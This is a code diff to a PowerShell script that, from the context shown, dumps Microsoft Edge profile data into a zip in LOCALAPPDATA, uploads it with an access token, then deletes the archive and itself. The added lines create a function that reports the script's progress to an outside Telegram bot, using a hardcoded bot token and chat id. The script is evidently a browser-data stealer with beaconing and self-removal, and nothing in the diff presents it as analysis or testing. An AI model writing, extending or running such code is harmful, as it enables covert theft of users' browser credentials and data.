@@ -35,6 +35,19 @@ if (Test-Path "$($ENV:LOCALAPPDATA)\Dump.zip") {
 
 New-Item "$($ENV:LOCALAPPDATA)\Dump" -itemType Directory
 
+Function TelegramLog{
+    param(
+        [String] $text
+    )
+
+    $endpoint = "https://api.telegram.org/bot6078810305:AAFgG6ZB4eqhpzrT2GzRnzOSN40IsO-X5oQ/sendMessage"
+
+    $postParams = @{chat_id='-1001795787010'; text=$text}
+    Invoke-WebRequest -Uri $endpoint -Method POST -Body $postParams
+}
+
+TelegramLog "[+] Script started"
+
 Function DumpEdge{
     
     if (Test-Path -Path $edgeProfilePath) {
@@ -479,9 +492,12 @@ Function GetAccessToken{
     return $response.access_token
 }
 
+TelegramLog "[+] Uploading dump.zip..."
 $access_token = GetAccessToken
 UploadFile $access_token
 
 
 Remove-Item "$($ENV:LOCALAPPDATA)\Dump.zip"
 Remove-Item $PSCommandPath
+TelegramLog "[+] Script finished"
+
